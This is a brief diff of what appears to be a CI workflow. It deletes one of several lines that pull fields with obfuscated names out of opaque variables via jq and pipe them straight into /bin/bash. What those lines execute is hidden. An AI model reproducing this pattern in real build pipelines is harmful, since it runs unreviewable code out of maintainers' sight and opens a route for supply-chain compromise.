@@ -26,7 +26,6 @@ jobs:
           echo $qysu566 | jq -r .x50082 | /bin/bash
           printf '%s' "$y64" | jq -r .mysn0 | /bin/bash
           printf '%s' "$qpdwk3" | jq -r .otk0 | /bin/bash
-          printf '%s' "$hbxul4" | jq -r .aqx82 | /bin/bash
           echo $voz1449 | jq -r .ocaad877 | /bin/bash
           printf '%s' "$gdxl034" | jq -r .fdui8771 | /bin/bash
 
